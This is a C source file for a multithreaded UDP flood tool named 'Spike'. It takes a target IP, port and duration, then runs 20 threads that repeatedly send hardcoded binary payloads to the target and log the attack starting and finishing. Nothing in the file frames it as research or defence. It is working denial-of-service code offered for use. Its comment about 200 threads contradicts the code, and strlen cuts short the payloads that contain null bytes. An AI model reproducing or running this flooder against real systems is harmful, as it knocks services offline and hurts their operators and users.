#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./Spike ip port time\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
"\xA6\x0B\x0B\x57\x39\xDA\xAE\xF4\xD3\x4C\x44\xC9\x31\x8C\xE3\x90\xC1\x76\x2E\xC0\xFF\x81\xB7\x26\x0F\x00\xAF\xB6\xAE\x97\x4E\xAC\x74\x95\x49\x07\x2E\xCA\xF1\x88\x6D\x74\x36\x69\xBA\xB2\xD7\xAC\x0E\x19\x5D\x94\x1C\x57\xA1\x04\xFF\x53\x42\x62\x82\x24\x30\x9A\x3F\x31\xAE\xF1\x5E\xD8\x7E\xBF\x4D\x05\xFF\xE0\xB9\x14\x18\xBA\x38\x9F\xF7\x55\x09\x4C\x1D\xF8\xA6\x71\x68\x35\x34\xEF\x63\x25\xD1\x68\x44\x64\xE2\xD0\xFD\x77\xE1\xE0\x37\xF3\x76\xFA\x53\x26\xB5\x02\xEC\x3E\xA8\xE9\xB0\x2E\x41\x2F\xD2\x1E\xC4\x30\x96\x64\xCF\xE2\x65\x2D\x3A\x0D\x85\xC1\x5E\x4A\x1D\xB2\x3C\x2E\xAC\x9A\xC8\xA0\xB4\xBF\xA3\x96\xF8\x57\xE2\x4C\x32\xA0\x4B\x98\x66\xA0\x28\x6C\x04\x98\x50\xDA\xEF\x2C\x78\x61\x93\xF7\x0F\xF9\xB1\x2D\xAD\x8F\xCB\x96\xC5\xC4\xAB\x23\xF6\x11\xC8\xCF\xFD\x29\x82\x78\x57\xFE\xF1\xB8\xF7\x5E\xFE\x34\x2C\x31\xD2\xE6\xB4\x3E\x7E\x1C\xB9\xB4\x78\x69\xEF\xC6\xB6\x0A\x59\x89\xB2\xCF\x41\x81\xB6\x61\x54\x4E\xF1\x3B\x85\x0E\x8B\xC1\x77\x32\x2A\x82\xDA\xD7\x74\xB3\xEB\x00\x22\x30\xCD\xEB\x1A\x49\xB8\x0B\x7F\xBA\x85\xD0\x86\xE0\x62\x29\x97\xA4\x8B\x4F\x12\x65\x20\x28\x91\xFE\xB6\xF2\xEC\x57\x7E\x6F\xC4\xC6\xCB\xA4\xA9\xFA\x08\xDA\xB2\x02\x04\x1B\x5D\xA8\x43\xD8\x88\x62\x2A\x4C\xBB\x52\x8B\x98\xCC\xC2\xFE\x5F\x0B\x3B\x51\x27\x62\xFC\x6B\x4D\xB3\xCA\xFF\x36\x3A\xF1\xA1\x47\xF8\x35\x68\x59\x7A\xDF\xA7\x2E\x89\x21\x7F\x08\x43\x8D\x14\xC4\x1C\x52\x8E\xC7\xBC\xCF\x66\x1A\x21\x05\xB9\x95\xF7\xBC\x18\xDF\xFB\x0B\x59\xDC\x5F\xB6\x42\xF8\x19\x89\x4B\x2D\xDF\x65\x61\xC7\xF6\x4E\xDA\xAC\xFF\x89\x8A\xAD\xAA\xA3\xD7\xDD\x79\xE4\x74\x26\x24\xCF\xFA\xAA\x18\xAB\xD5\x63\xE6\xC2\xC8\x92\xE0\x2E\xEF\xAF\x85\xCA\x9B\xF6\xFD\x7C\x0C\x49\x6B\x1D\x87\x18\x0A\x63\x7C\x5F\x8F\x64\x0E\x0C\xFB\x8B\xC3\xB9\xDC\x0E\xC3\x0C\x41\x3D\xA3\x67\x2F\x1C\x0E\x0A\x32\xEB\xE7\xDF\x15\x39\xF2\xE9\x3E\xAF\x4C\xF8\x34\x85\x59\x1B\xBE\x4A\x88\xF5\xDB\x37\x45\x6C\x8E\xA4\x87\x9B\x3C\x5C\x44\xAD\x9A\xDA\x94\x81\xC9\xFE\x94\xC4\xCB\x09\x9B\x30\x54\x41\x60\xD0\xC2\x60\x7A\x3D\x77\x50\xB4\xD6\x4B\x22\x5E\xD8\x36\x8B\x1C\x12\xFF\x57\x33\x1D\xEC\x17\x95\x18",

"\x52\xB6\x84\x77\xDC\x5C\x8E\x8D\xE4\x5C\x18\xC9\xF2\x3C\x5E\xF7\x51\xD4\x04\x0B\xDA\x49\x8C\x00\xC5\x65\xDA\x5D\x79\xCB\xE2\x1E\x19\x34\x4C\x27\x2D\xDA\xCA\xCC\x46\xD0\xB7\x13\xF4\x9A\x69\x81\xD8\x3D\x2D\x9E\x2C\x04\x5E\x7A\x9B\x67\xE4\xED\x9F\xBD\x58\xB5\x49\xB9\xD4\xE1\x5C\xA8\x7F\x7B\x59\xF4\xEE\xAD\x19\x78\xEA\x20\xB7\x02\xD3\x30\xD9\x6F\xEF\x87\xA2\xAF\x31\x50\x89\x2D\x0E\xC6\x91\xE8\x4B\xB4\x78\x77\xD0\xB9\x0A\x61\x70\x88\x64\xE6\x75\x27\xC8\x0F\x9D\xA2\x4B\x01\x87\x31\x89\x8B\xDD\x4E\x57\x74\x73\x47\xC9\xA2\x5C\x11\x9A\xC3\xF3\xEC\x7E\xD4\x5D\x77\x83\x3D\xA0\x78\xFE\x3B\xF4\x42\xFC\x94\x88\x54\x56\x57\x3B\xFE\xBC\xB3\xCE\x5E\x30\xE9\x2C\x96\x06\x4F\x01\xE8\x08\x6C\x47\x1D\x37\x0B\xE8\x7B\xA5\xCE\xCA\x35\xC0\x5E\xD3\x32\xAA\xB0\x4D\xEB\xE3\x39\x9C\x0B\xB9\xE6\x23\x2D\x04\x64\x27\xE8\x98\x0F\x63\x07\x06\x93\x84\xBD\x1E\xAC\xA2\xC1\x13\xF0\xEF\xEA\xC3\x12\xE7\xCB\x17\xE6\x01\x40\x7D\x7E\x41\xDF\x9C\xC3\x78\x12\x8C\xA2\x8A\xF4\xA2\x29\x99\x9A\x24\xA3\xA4\x5F\x3B\xD5\x2A\x36\x81\xB3\xE5\x92\xEA\x75\x30\x89\x62\x1A\xF0\xA6\x4E\x5E\x44\x8A\xAA\xBB\x1D\x1B\x30\x45\xE1\xB9\x77\xC4\x06\xF2\xEB\xBC\x89\xD2\x64\xFC\xBA\x80\xE4\x37\x8C\xD6\x97\x94\x14\x5F\x25\x6C\x7A\x08\xB6\x28\xEE\x18\xFB\xC9\x15\x58\xC7\xD8\x62\x4A\x2D\x73\xDC\x0B\x8A\x22\x89\xF1\xD1\xEF\x7A\x34\x29\x6A\x1A\xDA\x24\x92\xEB\xB3\x9C\xCF\xDD\x24\x3E\x40\x76\x4B\x16\x7A\xBB\x52\xF6\x7F\xD0\x34\x3D\x50\xF5\xF9\x54\x16\xEA\xEA\x55\x8C\x5B\x16\xCB\x59\x18\x09\x87\x61\x5F\x6C\x30\x0F\x02\x66\x15\xB6\x32\xE0\x1C\x0E\x14\xFB\xCA\x9F\x5E\xE4\x67\x6C\xAE\x9F\xFB\xAA\x4D\xD3\xEB\x0B\x3A\xF9\x38\x3A\x40\x3A\x9F\xB5\xAF\xB4\x2C\xAF\xEC\x0E\x98\x7A\x49\x7E\x20\x73\x49\xFE\xCF\x8F\x74\x93\xCF\xD6\x18\xA0\x51\xF3\xE4\xBB\x47\x7C\x6F\xAE\xD0\xA7\x54\xCC\x26\x70\x8F\xB1\xD2\x9C\x35\xE2\x54\xB6\x3D\xD5\xBB\xEA\xF4\xDE\x97\xB4\x28\x97\x0F\xFD\xAF\x32\x59\x6B\x70\xA5\x56\x26\x8E\x5C\x4C\x0C\x4C\xA1\xB9\x1A\xF4\x75\xFB\xBD\xE3\x40\xFE\x30\x5D\xE5\xC6\xDC\x86\xDA\x3A\x68\x77\x66\xCC\xE8\x6B\x9E\x40\x18\x1B\x6B\x06\x9A",

"\xA6\x0B\x0B\x57\x41\xDA\xAE\xF4\xD3\x4C\x44\xC9\x31\x8C\xC7\x90\xC1\x6F\x2E\x30\xFC\x81\xF3\x28\x9F\x0C\x5F\xB5\x56\x96\xBA\xAC\x0E\x95\x8A\x98\xCF\x85\x00\x2F\x95\x07\xCA\x50\x44\xA6\xA8\x26\x31\xDA\xC2\x75\x53\xA4\x06\xFD\x0C\xAF\x3B\x9C\xB6\x5B\xAA\xA5\xFC\xAE\x4F\xBE\xAF\x7F\x86\xCC\xB1\x3C\x01\xF4\xC6\x9E\x67\x7F\xC7\xE0\xEA\xCC\x96\x94\x60\x04\x4B\x8F\x12\x4A\x8B\x50\xBD\xFA\x3F\x77\xB2\xFB\x82\x06\x2C\x56\x34\xB8\x0E\x56\xBD\x0F\xFE\xD3\xE8\xF9\xD2\x59\xF4\x74\x87\xCA\xD0\x34\x6B\xE1\x6A\x79\x68\x97\x38\x07\x9E\xC5\x47\xC2\xBB\xA8\x81\x5A\x6D\x66\x78\x48\xF1\xC7\x5B\x90\xBD\x1F\xAC\x1B\x32\x42\x3C\xD5\x3B\x91\xBB\x7C\xC9\x56\xA7\x37\x80\x1C\x23\x53\x2F\xC9\xD7\x93\x54\xF7\x0F\x7E\x51\x36\x3A\x5E\xE6\x35\x1E\x61\x4C\x35\x01\x9F\xB2\xC0\xCD\x1D\xB2\xC4\x48\xAA\x8F\x76\xE5\x14\x89\x49\x9D\x31\x83\x6C\xF6\x9E\xFF\x3A\xFF\xF7\xA2\xE1\x0E\x20\x9B\x94\x52\xCB\xB2\x1F\x46\x36\x2C\x7D\x72\xB7\xFC\xC5\x42\xBC\x2F\xA8\x42\x28\x28\xE1\x46\x6D\x4A\x3A\x6C\xFB\x24\xEA\xFC\x6B\x35\x33\xB5\x43\x0E\xE5\x59\xBD\x5F\x65\xB9\xC1\x70\x07\xB5\xCB\x78\x22\xAC\x2E\xB8\x63\x35\x29\x4B\x76\xD6\xB8\x2C\xD5\xC3\x42\x66\x09\xC3\x23\xA5\xFE\x18\x25\xBF\xA8\x8C\x5A\x6E\x2A\xD4\x7A\x20\xA7\xDF\x01\xBA\xBF\x3D\x41\xB4\xB2\xAE\xE2\xA5\xDD\x0B\x90\xA3\xD4\x00\xA7\x1E\x90\xC5\xCD\x5E\xAE\xF3\x3D\x8D\xEA\xA9\x53\x38\x53\x3F\xBE\x72\x23\xF5\x7A\xB4\x42\xD2\x98\xFF\x43\x92\x18\x85\x9A\xC4\x87\x48\xA3\xC6\x88\x14\x44\xAF\xF5\xA4\x3B\x3F\x3B\xE7\xE6\x54\x9B\x00\x90\x96\x81\x8B\x6B\x53\x27\xD9\xE2\xC4\x1F\x02\x66\x21\xF2\x28\xA1\x11\x05\x86\xA1\x7F\x4B\x72\x01\xD8\x43\xA0\x82\x88\x98\x2A\x3B\x15\x5A\x0A\x30\xD3\x0B\x55\xC2\x5A\x36\xCF\x92\x75\xDB\x62\xE5\xA8\x47\xAA\x83\x5C\xAF\x1A\x9A\xEC\xBA\x00\xBE\x17\x3F\x67\x59\x70\x14\x71\x89\x03\x33\xE7\x52\x34\x02\x1A\x42\x08\xDF\xC3\x28\x72\xB8\x0B\x26\x76\xCA\xE1\xAD\x7B\x06\x10\xCE\xAB\x90\xE5\x9A\x5A\x24\x22\x39\xD3\x31\xB4\x40\xB8\xDA\x01\x5A\x82\x1F\x74\x1B\xFA\x8D\x45\xD2\xFA\xA0\xDA\x10\x92\xC9\x43\x63\x06\xE4\xDF\xC1\x66\x36\x4C\x01\xBF\xF9\x6D\x0D\x8C",

"\x01\x00\x00\x04\x42\x01\x00\x02\x59\x1F\xF7\x7D\xC2\xEF\x00\x00\x09\xAA\x72\xCC\x17\x67\x5E\x1C\x04\x00\x00\x00\x28\x27\x69\x1B\x46\xB7\x00\x00\x00\x02\x00\x01\xEE\x01\xB9\x96\x01\x00\x09\x7A\x00\x00\x01\x00\x00\x04\x0B\x00\x00\x00\x01\x04\x0B\x01\x0A\x00\x23\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x12\x32\x34\x34\x38\x30\x36\x30\x32\x39\x37\x31\x38\x33\x33\x36\x34\x30\x00\x03\xDF\x00\x00\x00\x01\x03\xDF\x01\x0A\x00\x09\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\xDA\xD7\x32\xB4\x03\xC3\x2F\xFF\xAF\x1E\xA1\x26\x63\x8E\xFF\xF0\x1A\xEA\xDF\x8E\xDC\x70\x61\xDC\xA1\x04\x5B\xAE\xE2\x9F\x0F\xFA\xD0\x83\xD6\xDC\x55\x56\x1F\x6C\xC9\xEF\x0E\xF8\x8F\x03\x00\x93\x9A\x02\xE9\x4E\x15\xD0\xF1\x33\xBD\x03\xE4\x59\xDB\x6C\xA1\x72\x79\x18\xBA\xF4\x1C\x70\x44\x7C\xB6\xB3\xEE\x4B\x0E\x80\xBD\x9F\x36\x68\xA5\xEB\x83\x02\x1B\x7D\xF2\x5E\xBC\x4A\xFA\x66\xA8\x1A\x8D\x19\xDA\xAC\x75\x85\x88\xCF\xC6\x6B\xB1\x44\x10\x37\x02\x68\x94\x3E\xB5\x03\xFE\xBD\x7E\x0E\xBE\x10\x1C\x32\x2B\x31\x9A\xE4\x98\x30\x3A\xF4\x21\xF9\xD6\xB9\xC4\x00\x71\x64\x20\x4B\x54\xC1\x0C\x46\xC5\x72\x75\x2D\x5B\x62\x58\x64\xDB\x0D\x12\x29\xE6\x79\x48\x26\x84\x8A\xDA\xE1\xEE\x73\x48\xC0\x80\x8C\x72\xF7\x2E\x92\x65\x76\x42\x61\x04\xE5\x2B\xA8\x75\x7B\x09\x96\xF1\x43\xBE\x23\x87\xCB\x6A\x8D\x50\x71\xF2\x30\xAE\x4B\x1C\x9D\x35\x67\xD7\x2C\xF0\x7E\xDA\x3D\x5F\xB3\xC2\x8C\xF6\x56\x80\xEB\x36\x65\x2E\xA4\x17\x58\x78\x3F\x04\xD9\x29\xCB\xDB\x8D\x62\x11\xF7\x54\xDA\xB5\xF2\x4E\x89\xC6\x14\x25\x4A\x4B\x19\x41\x96\xBE\x00\x45\xF5\xDD\x7B\x92\xD7\x9E\xC6\xEF\x2F\xB0\x64\xFC\xB6\x3E\x63\xEC\xFF\x76\x6F\xEA\xDF\x42\xAE\x70\x61\xDC\x6C\x04\x6B\x7B\x95\x9F\xE6\x34\x86\x83\x84\x2C\x44\x07\x3C\xD4\x1E\xEF\x0E\x1F\xC3\x03\x00\x14\x9A\x02\xE9\xD9\x17\xE2\x76\x60\x8E\x03\x34\xEF\x97\x6C\xA9\x72\xEC\x18\xBA\x82\xAA\x05\xC0\x83\x0E\xB3\x54\xA4\x6A\x80\xBD\x4E\xF1\x13\xCD\x85\x24\x02\x25\xEC\x94\xB1\x3A\xD6\xA4\x9D\x1E\x1B\x13\x65\x40\xE6\x2B\xA8\x96\x06\xD2\x48\x76\xC0\xA1\x38\x0E\x0D\x04\x1C\xD8\x03\xAC\xA5\xF4\x0E\xC3\xCE\xE9\x4B\x07\x10\xC8\x8E\x56\x15\x02\x8E\x28\x4B\x1D\xEC\xC4\xC1\x32\xBE\x20\xBA\xBB\x8E\x0C\x2C\x59\x8A\x4A\xE6\xB2\xD1\xCD\xED\x2E\xC0\x10\x1F\x9C\xB5\x48\x17\x18\xE6\xDA\xBC\x5A\x8C\x68\x31\x2B\xEB\x0C\x5E\xF7\xF8\x5D\x12\x87\xE6\x04\xD0\xC4\x4B\x75\xF6\xA4\x96\xF1\x64\xE8\xC1\xF7\x5A\x34\xE6\x6D\x83\x82\x30\xC4\x6C\xCF\x9D\x6F\xA9\xB3\x3F\x6D\xC5\xEB\x3D\x5F\x8C\x23\x8C\xF6\x68\x4B\xEB\x36\x14\x01\xA4\xF0\x92\xF1\x3F\x29\x2F\x52\xCB\xDB\x8A\xC1\xF8\x1A\xD1\x5F\xB5\xF2\xF7\xE2\x72\x14\x3A\x48\x4B\x19\x3F\xC2\xBE\x3C\x0D\x9A\xDD\x85\x9C\xBE\xF5\x48\xEA\x75\xFF\xAF\xFC\xB6\xC8\x49\xEC\xFF\xE9\x6F\xEA\xBA\x42\x69\x70\x87\xD1\xA1\x04\xF9\xAE\xE2\x9F\x3A\xFA\xD0\x83\xC4\xDC\x2F\x9B\x66\x6C\xDF\x09\x8C\xF8\xC3\xF6\x00\x02\xD4\xD8\x94\x0B\x1B\xCE\x7B\x99\x5C\xD5\x3E\x4D\x49\x6C\xA9\x69\xB0\x18\xBA\xF5\xAA\x05\x05\x83\x6B\xB3\x6D\x4B\x0E\x80\x10\xF8\x76\x13\x2E\xE2\xD0\x02\x50\xEC\x76\x94\x31\xD6\xCA\xE9\x2C\x8E\x0B\x72\x78\xE6\x2B\x3E\x29\x06\xD2\x7D\x24\xC0\xA1\x38\x67\x0D\x0C\x3E\xB5\x03\x9A\xBD\x2E\xC3\x92\x10\x61\x32\x07\x31\x18\xE4\x56\x30\x4A\xCF\x28\xF9\xF0\xB9\xBF\x67\xBF\x64\x58\x53\xB5\xC1\x8D\xD0\xDF\x72\x4A\xDE\x61\x62\xCD\xF7\x6B\x0D\x10\x27\x43\x79\x48\x20\x29\x8A\x",

"\x01\x00\x00\x00\x35\x04\x00\x00\x00\x02\xF7\x7D\xC2\xEF\x00\x00\x09\xAA\x72\xCC\x17\x67\x5E\x1C\x04\x00\x00\x00\x28\x27\x69\x1B\x46\xB7\x00\x5A\x25\x80\x1E\x8B\xC8\x74\xE6\xC4\xEB\x9E\xA7\x1E\xCD\x84\xB2\x8F\x00\x01\x00\x00\x00\x54\x0C\x00\x00\x00\x03\xF7\x7D\xC2\xEF\x00\x00\x09\xAA\x72\xCC\x17\x67\x5E\x1C\x04\x00\x00\x00\x28\x27\x69\x1B\x46\xB7\x31\xFC\x10\x09\x16\x2D\xE7\xD3\x41\x6B\x5D\x84\xD5\xD7\x1E\x0A\x13\xBA\x81\x92\x71\x2D\x8C\xBE\x5E\xB6\xC7\x8F\xAC\x73\x00\x36\x9C\x21\xC5\xD1\x29\x9A\x95\x79\x87\x1B\xB4\xD2\xB5\xD6\xBA\x9A\xD6\x84",
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = 20;  // Hardcoded to 200 threads
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID:  %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join \n");
    return 0;
}